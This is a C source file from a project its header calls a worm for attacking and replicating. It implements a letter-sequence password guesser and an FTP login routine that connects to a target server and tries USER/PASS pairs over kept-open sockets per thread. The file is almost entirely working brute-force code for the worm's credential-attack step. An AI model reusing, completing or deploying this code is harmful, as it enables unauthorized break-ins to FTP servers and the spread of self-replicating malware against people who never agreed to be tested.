/*
 * Worm - Simple mechanism for attack and replicate
 *
 * Copyright (C) 2016  Rafael Ravedutti Lucio Machado
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 2
 * of the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
 */

#include "bruteforce.h"

int bruteforce(char *dest, unsigned int maxlength) {
  static char guess[MAX_PASSWORD_LENGTH];
  static unsigned char guess_map[MAX_PASSWORD_LENGTH];
  static int guess_length = 0;
  char characters[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
  unsigned int nchars, i;

  nchars = strlen(characters);

  if(guess_length == 0) {
    for(i = 0; i < maxlength; ++i) {
      guess[i] = '\0';
      guess_map[i] = 0;
    }

    guess[0] = characters[0];
    guess_length = 1;
  } else {
    if(guess_length > maxlength) {
      guess_length = 0;
      return 0;
    }

    guess_map[0]++;

    for(i = 0; guess_map[i] > nchars - 1; ++i) {
      guess_map[i] = 0;
      guess_map[i + 1]++;
    }

    if(i >= guess_length) {
      guess_map[guess_length] = 0;
      ++guess_length;
    }

    for(i = 0; i < guess_length; ++i) {
      guess[i] = characters[guess_map[i]];
    }
  }

  strncpy(dest, guess, maxlength);
  return 1;
}

int ftp_try_login(const char *address, unsigned int port, const char *user, const char *password, int thread_id) {
  char answer[128];
  char request[32];
  struct sockaddr_in addr;
  static int tries[MAX_THREADS] = { 0 };
  static int thread_socks[MAX_THREADS] = { 0 };
  int sock, length;

  if(thread_id < 0 || thread_id >= MAX_THREADS) {
    fprintf(stderr, "ftp_try_login(): Invalid thread id \"%d\" specified!", thread_id);
    return -1;
  }

  sock = thread_socks[thread_id];

  if(sock == 0 || tries[thread_id] == 0) {
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(address);  
    memset(addr.sin_zero, 0, sizeof(addr.sin_zero));

    if(sock != 0) {
      close(sock);
    }

    if((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
      perror("ftp_try_login (socket)");
      return -1;
    }

    if(connect(sock, (struct sockaddr *) &addr, sizeof(struct sockaddr_in)) < 0) {
      perror("ftp_try_login (connect)");
      close(sock);
      return -1;
    }

    if(recv(sock, answer, sizeof answer, 0) < 0) {
      perror("ftp_try_login (recv)");
      return -1;
    }

    if(strncmp(answer, "220", 3) != 0) {
      close(sock);
      thread_socks[thread_id] = 0;
      return -1;
    }

    thread_socks[thread_id] = sock;
    tries[thread_id] = FTP_LOGIN_TRIES;
  }

  answer[0] = '\0';
  while(strncmp(answer, "331", 3) != 0) {
    length = snprintf(request, sizeof request, "USER %s\n", user);
    if(send(sock, request, length, 0) < 0) {
      perror("ftp_try_login (send)");
      return -1;
    }

    if(recv(sock, answer, sizeof answer, 0) < 0) {
      perror("ftp_try_login (recv)");
      return -1;
    }
  }

  length = snprintf(request, sizeof request, "PASS %s\n", password);
  if(send(sock, request, length, 0) < 0) {
    perror("ftp_try_login (send)");
    return -1;
  }

  answer[0] = '\0';
  if(recv(sock, answer, sizeof answer, 0) < 0) {
    perror("ftp_try_login (recv)");
    return -1;
  }

  --tries[thread_id];
  return (strncmp(answer, "230", 3) == 0) ? sock : 0;
}

#ifdef BRUTEFORCE_MAIN

int main(int argc, const char *argv[]) {
  char dest[MAX_PASSWORD_LENGTH];

  while(bruteforce(dest, sizeof dest)) {
    fprintf(stdout, "%s\n", dest);
    usleep(500);
  }

  return 0;
}

#endif
